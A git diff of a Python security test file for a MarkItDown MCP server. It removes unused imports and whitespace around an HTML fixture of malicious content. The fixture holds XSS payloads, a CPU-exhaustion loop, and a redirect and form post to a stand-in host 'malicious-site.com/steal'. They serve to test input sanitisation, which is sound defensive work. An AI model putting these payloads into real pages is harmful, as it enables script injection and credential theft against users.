@@ -5,16 +5,12 @@ Tests server behavior with malicious file content and formats.
 
 import base64
 import json
-import tempfile
-import xml.etree.ElementTree as ET
 import zipfile
 from pathlib import Path
-from typing import Any, Dict, List
 
 import pytest
 
 from markitdown_mcp.server import MarkItDownMCPServer, MCPRequest
-from tests.helpers.assertions import assert_mcp_error_response, assert_mcp_success_response
 
 
 class MaliciousFileGenerator:
@@ -108,7 +104,7 @@ class MaliciousFileGenerator:
         // This is a test script that should be sanitized
         alert("XSS Test");
         document.cookie = "stolen=credentials";
-        
+
         // Infinite loop attempt
         while(true) {
             console.log("CPU exhaustion attempt");
@@ -121,18 +117,18 @@ class MaliciousFileGenerator:
         // Another script block
         window.location = "http://malicious-site.com";
     </script>
-    
+
     <img src="x" onerror="alert('XSS via img tag')">
-    
+
     <a href="javascript:alert('XSS via link')">Click me</a>
-    
+
     <form action="http://malicious-site.com/steal" method="post">
         <input type="hidden" name="csrf" value="attack">
         <input type="submit" value="Submit">
     </form>
-    
+
     <iframe src="javascript:alert('XSS via iframe')"></iframe>
-    
+
     <div onclick="alert('XSS via onclick')">Click this div</div>
 </body>
 </html>"""
